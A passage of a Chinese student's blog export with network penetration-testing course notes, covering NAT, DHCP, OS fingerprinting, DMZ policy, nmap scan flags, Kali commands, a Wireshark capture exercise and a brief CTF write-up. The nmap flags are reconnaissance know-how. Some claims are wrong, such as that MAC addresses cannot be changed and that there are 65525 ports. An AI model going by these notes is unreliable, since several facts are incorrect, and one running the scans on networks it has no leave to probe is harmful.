        <content type="html"><![CDATA[<h4 id="RFC1597"><a href="#RFC1597" class="headerlink" title="RFC1597:"></a>RFC1597:</h4><p>一种保存地址空间的方法，这种方法不用给某个企业内部的私有主机分配全局唯一的IP地址，但是允许企业内部之间吗所有主机之间以及企业外部的所有共有主机之间的完全的网络连接。</p><h4 id="IP在公网中是唯一的"><a href="#IP在公网中是唯一的" class="headerlink" title="IP在公网中是唯一的"></a>IP在公网中是唯一的</h4><p>在个人的私有网络中并不是，比如你的内网地址是192.168.xxx.xxx，另一个人的也是，但你不能说你们的公网IP是唯一的，所以要加限制条件</p><h4 id="网络地址转换："><a href="#网络地址转换：" class="headerlink" title="网络地址转换："></a>网络地址转换：</h4><h5 id="SNAT：源网络地址转换："><a href="#SNAT：源网络地址转换：" class="headerlink" title="SNAT：源网络地址转换："></a><strong>SNAT：</strong>源网络地址转换：</h5><p>用于将内部网络中的源IP地址修改为公网可路由的IP地址</p><h5 id="DNAT：目标网络地址转换："><a href="#DNAT：目标网络地址转换：" class="headerlink" title="DNAT：目标网络地址转换："></a><strong>DNAT：</strong>目标网络地址转换：</h5><p>用于将外部请求的目标地址转换为内网中的特定IP地址</p><h5 id="SNAT和DNAT的使用场景："><a href="#SNAT和DNAT的使用场景：" class="headerlink" title="SNAT和DNAT的使用场景："></a>SNAT和DNAT的使用场景：</h5><h6 id="DNAT技术通常用于以下几种情况："><a href="#DNAT技术通常用于以下几种情况：" class="headerlink" title="DNAT技术通常用于以下几种情况："></a>DNAT技术通常用于以下几种情况：</h6><ul><li>允许外部用户通过互联网访问内部Web服务器、邮件服务器等服务。</li><li>允许外部用户通过VPN连接到内部网络。</li><li>允许外部用户使用远程桌面协议（RDP）连接内部Windows服务器。</li></ul><h6 id="SNAT技术通常用于以下几种情况："><a href="#SNAT技术通常用于以下几种情况：" class="headerlink" title="SNAT技术通常用于以下几种情况："></a>SNAT技术通常用于以下几种情况：</h6><ul><li>增加<a href="https://cloud.tencent.com/product/ns?from_column=20065&amp;from=20065">网络安全</a>性，防止来自外部网络的攻击。</li><li>控制流量分配，以提高网络带宽效率。</li><li>允许内部计算机访问外部资源。</li></ul><p>一个端口号是16位表示，65525个端口）</p><h5 id="ISP-Internet-Service-Provider"><a href="#ISP-Internet-Service-Provider" class="headerlink" title="ISP:Internet Service Provider:"></a>ISP:Internet Service Provider:</h5><p>互联网服务提供商，就是联通移动电信这一类给你提供上网的</p><p>ipconfig/release：ip查看并且释放</p><p>ipconfig/renew：ip查看并且重新连接</p><p><strong>防火墙在网络层，WAF在应用层</strong></p><p><strong>为什么防火墙会知道你是ICMP，因为他在解析传输层中会看到里面的协议Protocal</strong></p><p>同一子网，看ARP缓存）</p><p><a href="https://zhuanlan.zhihu.com/p/148644458">https://zhuanlan.zhihu.com/p/148644458</a></p><p>TCP FIN可以用来知道你的从操作系统是什么</p><p>常见的端口号</p><p><a href="https://imgse.com/i/picEaNT"><img src="https://z1.ax1x.com/2023/12/06/picEaNT.png" alt="picEaNT.png"></a></p><p>其中FTP的20端口是用来进行数据传输，21端口是用来进行访问控制</p><h4 id="引导协议BOOTP"><a href="#引导协议BOOTP" class="headerlink" title="引导协议BOOTP"></a>引导协议BOOTP</h4><p>是一种基于UDP的协议。用于从服务器得到自己的IP地址、服务器的IP地址、启动映像文件名、网关IP等等</p><h5 id="获取IP地址的过程"><a href="#获取IP地址的过程" class="headerlink" title="获取IP地址的过程"></a>获取IP地址的过程</h5><p>首先，客户端使用广播形式以IP地址255.255.255.255向网络中发出IP地址查询要求。运行BOOTP协议的服务器接收到这个请求，会发送一个含有IP地址、服务器IP地址、网关等信息的FOUND帧。客户端会根据该FOUND帧来获得自己的IP地址</p><h4 id="动态地址配置协议DHCP协议（Dynamic-Host-Configuration-Protocol）"><a href="#动态地址配置协议DHCP协议（Dynamic-Host-Configuration-Protocol）" class="headerlink" title="动态地址配置协议DHCP协议（Dynamic Host Configuration Protocol）"></a>动态地址配置协议DHCP协议（Dynamic Host Configuration Protocol）</h4><p>DHCP是BOOTP的扩展，基于客户/服务器模式的，提供了一种动态指定IP地址和配置参数的机制。</p><h5 id="DHCP的工作原理"><a href="#DHCP的工作原理" class="headerlink" title="DHCP的工作原理"></a>DHCP的工作原理</h5><p>寻找DHCP服务器（发布一个DHCP广播包来得知DHCP服务器），提供IP租用地址（在某一时间段来使用的地址，并不是固定给这个客户使用），接受IP租约</p><p><a href="https://www.jianshu.com/p/f013acd35898">BOOTP协议与DHCP协议 - 简书 (jianshu.com)</a></p><h4 id="网络指纹："><a href="#网络指纹：" class="headerlink" title="网络指纹："></a>网络指纹：</h4><p>网络指纹是指在互联网上识别和跟踪用户的一种方法，通过收集和分析用户在网络上的行为、设备信息、软件配置等数据来创建对用户的唯一标识。网络指纹通常包括以下内容：</p><ol><li><strong>设备信息</strong>: 包括用户的操作系统、浏览器类型和版本、屏幕分辨率、时区等设备特征。</li><li><strong>网络属性</strong>: 包括用户的 IP 地址、网络提供商（ISP）信息、地理位置等。</li><li><strong>浏览行为</strong>: 包括用户的点击模式、页面浏览习惯、访问频率等。</li><li><strong>其他参数</strong>: 一些网站还可能收集关于用户的其他信息，比如语言设置、插件信息、字体配置等。</li></ol><p>通过收集这些信息，网站和广告商可以创建一个独特的“指纹”来标识和跟踪用户，即使用户在不同设备和网络下访问网站，也可以被识别出来。</p><p>网络指纹技术的使用可以帮助网站提供个性化的服务，但也引发了隐私保护的问题。一些用户可能认为这种行为侵犯了他们的隐私权，因此网络指纹也成为了隐私保护领域的一个重要议题。</p><h5 id="os-fngerprinting"><a href="#os-fngerprinting" class="headerlink" title="os fngerprinting"></a>os fngerprinting</h5><p>操作系统指纹识别（OS fingerprinting）是一种通过识别和分析网络上连接的设备的特征来确定其操作系统的方法。它基于操作系统在网络通信中产生的一些特定行为和响应模式。</p><p>操作系统指纹识别的原理是通过发送一系列特定的网络请求，观察目标设备在响应时所表现出的行为和特征，从而推断出该设备正在运行的操作系统类型和版本。</p><p>这些特征可能包括：</p><ol><li><strong>TCP/IP栈实现</strong>: 不同的操作系统对于TCP/IP协议栈的实现方式有所差异，如TCP/IP选项、初始序列号(ISN)的生成方式等。</li><li><strong>网络协议响应</strong>: 操作系统对网络请求的响应可能会有不同的行为，比如对于某些特定的请求或错误条件的处理方式。</li><li><strong>时间延迟和超时</strong>: 操作系统在响应网络请求时可能会有不同的延迟和超时设置。</li><li><strong>默认开放的网络端口</strong>: 不同操作系统可能会默认打开一些特定的网络端口，这些端口可以用于区分操作系统类型。</li></ol><p>通过分析这些特征，网络安全工具和技术可以尝试识别设备的操作系统，并据此进行针对性的漏洞扫描、探测等操作。</p><p>需要注意的是，操作系统指纹识别并非完全准确，不同的设备和网络环境可能导致结果的误判或不准确性。此外，一些设备可能会采取措施来隐藏或模糊操作系统指纹，以增加网络安全性。</p><h5 id="CIDR地址"><a href="#CIDR地址" class="headerlink" title="CIDR地址"></a>CIDR地址</h5><p>这个佬写的很详细了，我就不买弄了（）</p><p><a href="https://blog.csdn.net/dan15188387481/article/details/49873923">CIDR地址块及其子网划分（内含原始IP地址分类及其子网划分的介绍）_cidr块-CSDN博客</a></p><p>wifi安全性</p><p>学校的wifi根据MAC地址的前六个字节判断是否是虚拟机来请求IP，如果是则拒绝</p><p>防火墙工作原理</p><p>防护墙作用在非军事区，用于将内网和外部网络隔离开</p><p>操作系统协议栈，指纹</p><p>这个上面说了，可以往上回看</p><p>nmap探测</p><p>常见的就是-A -O -sP -p -sV</p><p>-sP 10.0.105.1/24 ：探测10.0.105网段中的全部主机。</p><p>-O IP ：探测指定IP的相关数据。</p><p>-p 端口号1，端口号2 IP : 探测指定IP是否打开指定端口</p><p>-p 端口号1，端口号2 IP -sV：探测指定IP、指定端口是那个版本的软件打开的。</p><p>-A IP -oN 存储路径：在指定路径下生成相关操作的txt报告。</p><p>-A IP ：扫描指定IP的全部内容。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/11/30/2023%E5%B9%B411%E6%9C%8830%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95ch4/"/>
      <url>/2023/11/30/2023%E5%B9%B411%E6%9C%8830%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95ch4/</url>
      
        <content type="html"><![CDATA[<h3 id="Review："><a href="#Review：" class="headerlink" title="Review："></a>Review：</h3><p>子网掩码：与IP地址做与运算判断是否在同一网络中</p><h3 id="TCP-IP协议，体系"><a href="#TCP-IP协议，体系" class="headerlink" title="TCP/IP协议，体系"></a>TCP/IP协议，体系</h3><p>TCP/IP是常用的四层结构，</p><p><img src="https://img-blog.csdn.net/20171215000304120?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMjI0NjQ1NQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>协议是<strong>水平的</strong>，即两个协议是<strong>控制两个对等的实体</strong>进行通信的规则。</p><p>服务是<strong>垂直的</strong>，即服务是<strong>从下通过层间接口向上</strong>进行提供的</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><p><a href="https://imgse.com/i/piUdJeA"><img src="https://z1.ax1x.com/2023/11/20/piUdJeA.png" alt="piUdJeA.png"></a></p><p>传输层中以端口做区分，也可以叫做是传输层的地址</p><p>域名也被看做是一个地址</p><p><a href="https://imgse.com/i/piUdtot"><img src="https://z1.ax1x.com/2023/11/20/piUdtot.png" alt="piUdtot.png"></a></p><p>MAC地址不可更改！！！</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p><a href="https://imgse.com/i/piUdUFP"><img src="https://z1.ax1x.com/2023/11/20/piUdUFP.png" alt="piUdUFP.png"></a></p><p>互联网的最小单位是交换机以及其下连接的电脑，交换机通过一个路由器连接到其他的交换机</p><h3 id="交叉线"><a href="#交叉线" class="headerlink" title="交叉线"></a>交叉线</h3><p>直通线：网线两头线序一致（均为568A或68B）叫直通线。<br>交叉线：网线一头是568A线序，另一头是568B线序。</p><p>如果是计算机与交换机或HUB相连，则两头都做568a，或两头都做568b，即使用直通线；如果是两台计算机互连或ADSL MODEM与HUB连接，则需要一头做568a，另一头做568b，也就是常说的1和3，2和6互换了，即使用交叉线。</p><p><img src="https://bkimg.cdn.bcebos.com/pic/0dd7912397dda144da48b24db8b7d0a20df48688?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U5Mg==,g_7,xp_5,yp_5/format,f_auto" alt="img"></p><h5 id="网关配置中通常使用-1还是-254？"><a href="#网关配置中通常使用-1还是-254？" class="headerlink" title="网关配置中通常使用.1还是.254？"></a>网关配置中通常使用.1还是.254？</h5><p><strong>一般来说是254，因为一般255是作为广播地址，而在1-254中随便选择一个数还要跳过的话，不如直接将254设置成网关</strong></p><p>LAN和WAN</p><p>GPON：<a href="https://zhuanlan.zhihu.com/p/80270214">EPON与GPON的应用与区别 - 知乎 (zhihu.com)</a></p><p>ISP网络服务提供商</p><p>ACL访问控制列表</p><h3 id="ABC类网段"><a href="#ABC类网段" class="headerlink" title="ABC类网段"></a>ABC类网段</h3><p>10开头的IP是A类地址的私有地址</p><p>C类网络是最多的，但是只能容纳2^8 -2个主机IP</p><p>A类网络是最少的，但是只能容纳2^24 -2个主机IP</p><p><img src="https://img-blog.csdnimg.cn/20190705095636130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3NzMyODI5,size_16,color_FFFFFF,t_70" alt="img"></p><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a><strong>NAT</strong></h3><p>IP地址中主机标识位全0表示整个网络全1表示广播</p><p>在<strong>公网</strong>的范围内，IP地址唯一</p><p>socket套接字</p><h3 id="UDP和TCP"><a href="#UDP和TCP" class="headerlink" title="UDP和TCP"></a>UDP和TCP</h3><p>TCP有连接，UDP无连接，广播，QQ都是用UDP，但是QQ传文件使用的是TCP</p><p>qq使用的是oicq协议（仅限腾讯qq.exe，tim和qq内测版不是oicq的）</p><h3 id="交换机switch"><a href="#交换机switch" class="headerlink" title="交换机switch"></a>交换机switch</h3><p>switch既可以表示交换机也可以表示开关，交换机用过CAM进行数据帧转发，当交换机收到数据帧时，会查找CAM表对应的表象并转发给对应接口。这个过程就像开关闭合</p><h3 id="任务："><a href="#任务：" class="headerlink" title="任务："></a>任务：</h3><p>手机传图片给电脑抓包</p><p>首先打开wireshark抓包，手机电脑要再同一网络下，</p><p><a href="https://imgse.com/i/piU6PKK"><img src="https://z1.ax1x.com/2023/11/20/piU6PKK.png" alt="piU6PKK.png"></a></p><p>ip.src==你手机的ip，因为传文件是TCP协议，随便抓一个追踪流就行，记得改成原始数据</p><p><a href="https://imgse.com/i/piU6FbD"><img src="https://z1.ax1x.com/2023/11/20/piU6FbD.png" alt="piU6FbD.png"></a></p><p>打不开，用010或者winhex删除前面的一大串就可</p><p><a href="https://imgse.com/i/piU6AVe"><img src="https://z1.ax1x.com/2023/11/20/piU6AVe.png" alt="piU6AVe.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/11/23/2023%E5%B9%B411%E6%9C%8823%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH3/"/>
      <url>/2023/11/23/2023%E5%B9%B411%E6%9C%8823%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH3/</url>
      
        <content type="html"><![CDATA[<h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h3><p>开源情报，指的是从公共资源中手机信息以在情报环境中使用他。</p><h2 id="内网，DMZ，外网"><a href="#内网，DMZ，外网" class="headerlink" title="内网，DMZ，外网"></a>内网，DMZ，外网</h2><p>DMZ是位于两个防火墙之间的空间，比    Internet的安全性高，比内网的安全性低。DMZ的中文称呼是隔离区，也称为非军事区</p><h3 id="内网，DMZ，外网之间的访问策略"><a href="#内网，DMZ，外网之间的访问策略" class="headerlink" title="内网，DMZ，外网之间的访问策略"></a>内网，DMZ，外网之间的访问策略</h3><h4 id="1-内网可以访问外网"><a href="#1-内网可以访问外网" class="headerlink" title="1.内网可以访问外网"></a>1.内网可以访问外网</h4><p>内网用户可以访问外网，在这里要进行源地址转换</p><h4 id="2-内网用户可以访问DMZ"><a href="#2-内网用户可以访问DMZ" class="headerlink" title="2.内网用户可以访问DMZ"></a>2.内网用户可以访问DMZ</h4><p>方便内网用户使用和管理DMZ的服务器</p><h4 id="3-外网不能访问内网"><a href="#3-外网不能访问内网" class="headerlink" title="3.外网不能访问内网"></a>3.外网不能访问内网</h4><h4 id="4-外网可以访问DMZ"><a href="#4-外网可以访问DMZ" class="headerlink" title="4.外网可以访问DMZ"></a>4.外网可以访问DMZ</h4><h4 id="5-DMZ不可以访问内网"><a href="#5-DMZ不可以访问内网" class="headerlink" title="5.DMZ不可以访问内网"></a>5.DMZ不可以访问内网</h4><h4 id="6-DMZ不可以访问外网"><a href="#6-DMZ不可以访问外网" class="headerlink" title="6.DMZ不可以访问外网"></a>6.DMZ不可以访问外网</h4><p>这一条有例外，比如将邮件服务器放置到DMZ就需要能够访问到外网。</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>内容分发网路，采用更大量的缓存服务器，不知放在用户相对集中的区域，当用户访问的时候利用全局负载技术，将用户的访问只想距离最近的缓存服务器上。</p><p>简单来说就是在用户的附近建立一个本地仓库，就近给你内容（发货）</p><p>可以看这一篇</p><p><a href="https://zhuanlan.zhihu.com/p/52362950">到底什么是CDN？ - 知乎 (zhihu.com)</a></p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>WEB应用防火墙</p><p>带宽的单位<strong>dps</strong>，当然也可以mbps</p><p><strong>hash是用来校验的</strong></p><h2 id="TTL—-网络中的生存时间"><a href="#TTL—-网络中的生存时间" class="headerlink" title="TTL—-网络中的生存时间"></a>TTL—-网络中的生存时间</h2><p>每经过一个路由器就会-1</p><p>不同的操作系统对TTL的初始值是不同的，比如</p><p><a href="https://imgse.com/i/piJSUE9"><img src="https://z1.ax1x.com/2023/11/13/piJSUE9.png" alt="piJSUE9.png"></a></p><p>我ping自己的本地是128，但是我ping</p><p>作业：</p><ul><li>与ZoomEye功能类似的搜索引擎还有哪些？</li></ul><p>奇安信的鹰图，fofa，站长之家等等</p><ul><li>子域名收集</li></ul><p><a href="https://imgse.com/i/piJS6De"><img src="https://z1.ax1x.com/2023/11/13/piJS6De.png" alt="piJS6De.png"></a></p><ul><li>利用ZoomEye进行相关搜索</li></ul><p><a href="https://imgse.com/i/piJS48P"><img src="https://z1.ax1x.com/2023/11/13/piJS48P.png" alt="piJS48P.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/11/06/2023%E5%B9%B411%E6%9C%886%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH2/"/>
      <url>/2023/11/06/2023%E5%B9%B411%E6%9C%886%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  查看你电脑的ip地址</span><br><span class="line">对于linux系统应该是ifconfig</span><br></pre></td></tr></table></figure><h3 id="查看IP信息"><a href="#查看IP信息" class="headerlink" title="查看IP信息"></a>查看IP信息</h3><h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><p>if—interface接口</p><p>config—configer配置程序</p><h4 id="eth0"><a href="#eth0" class="headerlink" title="eth0"></a>eth0</h4><p>eth—ethernet以太网</p><p><a href="https://baike.baidu.com/item/以太网/99684">以太网_百度百科 (baidu.com)</a></p><p>FE—快速以太网</p><p><a href="https://zhuanlan.zhihu.com/p/139707963">标准以太网、快速以太网、千兆以太网和万兆以太网分别是什么？ - 知乎 (zhihu.com)</a></p><p>localback回环地址</p><p>netmask子网掩码，判断你是在哪个网络中（IP地址和子网掩码进行”与“运算）</p><p>192.xxx.xxx.0最后一位是0表示这一个网络</p><p>192.xxx.xxx.255表示这个网络的所有主机</p><h3 id="查看路由信息"><a href="#查看路由信息" class="headerlink" title="查看路由信息"></a>查看路由信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再kali中是route -n</span><br><span class="line">再windows是route PRINT</span><br></pre></td></tr></table></figure><h3 id="DNS信息"><a href="#DNS信息" class="headerlink" title="DNS信息"></a>DNS信息</h3><p>每一个电脑实际上都是有一个DNS域名解析服务器nameserver</p><p>正常访问一个网站访问的是他的IP，这个IP并不方便记忆，所以出现了DNS，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.baidu.com</span><br><span class="line">com是一个互联网通用的</span><br><span class="line">baidu是百度的域名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样子就好记忆多了</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>网关是连接两个不同网络之间的通讯与控制</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMzgyMTA4LzIwMTYwNC8zODIxMDgtMjAxNjA0MDkxNjQ5MDMxNDAtOTQ5NTcyMDA3LnBuZw?x-oss-process=image/format,png" alt="img"></p><p>gateway默认网关</p><p>自动设置就是利用<strong>DHCP（Dynamic Host Configuration Protocol, 动态主机配置协议）服务器</strong>来自动给网络中的计算机分配IP地址、子网掩码和默认网关 。</p><h4 id="单播"><a href="#单播" class="headerlink" title="单播"></a>单播</h4><p>对特定的主机进行数据传送，简单来说就是两个设备点对点进行通信</p><h4 id="组播"><a href="#组播" class="headerlink" title="组播"></a>组播</h4><p>一个设备与关系其数据的部分设备进行通信，也就是说一个设备对一组特定的主机进行通信</p><p>(多用于<strong>D类IP</strong>)</p><h4 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h4><p>一个设备对本网络内所有设备进行通信就是广播</p><h2 id="虚拟机的三种模式"><a href="#虚拟机的三种模式" class="headerlink" title="虚拟机的三种模式"></a>虚拟机的三种模式</h2><p><img src="https://pic1.zhimg.com/80/v2-82deb4be7068ec65b3ab251df22d5130_720w.webp" alt="img"></p><h5 id="桥接"><a href="#桥接" class="headerlink" title="桥接"></a>桥接</h5><p>桥接就是使用物理机的MAC地址，但是是有自己的独立IP的</p><p><img src="https://img-blog.csdnimg.cn/20201216200700237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ3MzU0ODI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h5><p>NAT就是将物理机作为路由器进行上网</p><h5 id="HOST"><a href="#HOST" class="headerlink" title="HOST"></a>HOST</h5><p>图片来自</p><p><a href="https://zhuanlan.zhihu.com/p/65103100">“桥接”和“NAT”方式区别 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/qq_47354826/article/details/111301616">VMware虚拟机三种网络模式详解—Bridged（桥接模式）_vm桥接模式是什么意思-CSDN博客</a></p><h2 id="Kali-linux常用命令"><a href="#Kali-linux常用命令" class="headerlink" title="Kali linux常用命令"></a>Kali linux常用命令</h2><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PWD命令是Print Working Directory（打印工作目录）的缩写，其功能是显示当前工作目录。</span><br><span class="line">cd是Change Directory（更改目录）的缩写，其功能是将活动目录更改为指定的路径。</span><br><span class="line">ls命令用于显示指定工作目录下之内容（列出当前工作目录所含之文件及子目录)。</span><br><span class="line">locate命令用于查找符合条件的文件。</span><br><span class="line">whereis命令也用于查找文件。</span><br><span class="line">which命令会在环境变量$PATH设置的目录里查找符合条件的文件。  </span><br><span class="line">mkdir是make directory（创建目录）的缩写，用于创建新的目录。</span><br><span class="line">cp: 复制文件或目录，语法为“cp 源文件 目标文件”</span><br><span class="line">rmdir用来删除一个空的目录，rm 命令来删除非空目录。</span><br></pre></td></tr></table></figure><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat命令用来显示文件内容，语法为“cat 目录项”，cat命令可以在屏幕上显示文件，可以合并文件，还可以建立文本文件。</span><br><span class="line">另外head、tail、nl、more和less命令也可以用来浏览文件。</span><br><span class="line">grep 命令用于查找文件里符合条件的字符串。</span><br><span class="line">more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，使用者在阅读时可以按空格键（space）来显示下一页，按 b 键来返回（back）一页显示。</span><br><span class="line">less 与 more 类似，但使用 less 可以随意浏览文件，下面是使用less参数显示文件内容之后，使用者可以进行的一些操作。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Kali Linux 2同时支持net-tools和iproute2，所以可以使用这两种命令来完成对网络的配置和查看。如果要查看设备的网络连接信息，可以使用“ip addr”和“sudo ifconifg”</span><br><span class="line">ip命令中常用的方法有：</span><br><span class="line">ip addr show：显示网络信息；</span><br><span class="line">ip route show：显示路由 ；</span><br><span class="line">ip neigh show：显示arp表（相当于Windows的arp命令）；</span><br><span class="line">重启网络：ifdown &lt;网络接口名称&gt; ifup &lt;网络接口名称&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Shell脚本与Windows/Dos下的批处理相似，也就是用各类命令预先放入到一个文件中，方便一次性执行的一个程序文件，主要是方便进行设置或者管理用的。Shell 脚本的编写跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</span><br><span class="line">那么打开一个编辑器，输入以下内容。</span><br><span class="line">#! /bin/bash</span><br><span class="line">echo &quot;Hello, Kali!&quot;</span><br><span class="line">将该文件保存为HelloKali，不需要后缀名。</span><br><span class="line">当前我们还不能执行这个脚本，这是因为该脚本的权限导致的。这里可以使用ls -l命令来查看这个文件的权限。当前这个文件只有w和r权限，是不能执行的，这里需要为它添加一个可执行的权限。</span><br><span class="line">chmod  755  HelloKali</span><br><span class="line">再次使用ls -l查看，可以看到它具有了可执行权限。</span><br><span class="line">kali &gt; ./HelloKali</span><br><span class="line">这里的./ 可以理解为在当前目录下查找文件。</span><br><span class="line">按下回车可以看到屏幕上输出：</span><br><span class="line">Hello, Kali!</span><br><span class="line">这表明当前程序已经成功执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在Linux术语中，服务指的是在运行在后台等待使用的应用程序。Service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。在Kali linux2中预装了很多服务。在Kali Linux中的有些服务可以通过GUI停止和启动，就像在Windows或Mac里一样。但是，也有些服务需要使用命令行管理。我们在这里介绍管理基本服务的语法：</span><br><span class="line">service servicename start|stop|restart</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DreamEnding</title>
      <link href="/2023/04/15/2023%E5%B9%B44%E6%9C%8815%E6%97%A5-catctf/"/>
      <url>/2023/04/15/2023%E5%B9%B44%E6%9C%8815%E6%97%A5-catctf/</url>
      
        <content type="html"><![CDATA[<p>下载以后是一个</p><p>GPS数据流</p><p><a href="https://www.gpsvisualizer.com/map_input">https://www.gpsvisualizer.com/map_input</a></p><p>来着里面导入文件然后绘制，看图就好了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统教程</title>
      <link href="/2023/03/19/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%99%E7%A8%8B/"/>
      <url>/2023/03/19/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<hr><p>操作系统教程</p><p>之前用有道云笔记写的，懒得在搬运一遍了</p><p>（主要是添加图片太麻烦了）</p><p><a href="https://note.youdao.com/s/8SpqhXQY">https://note.youdao.com/s/8SpqhXQY</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
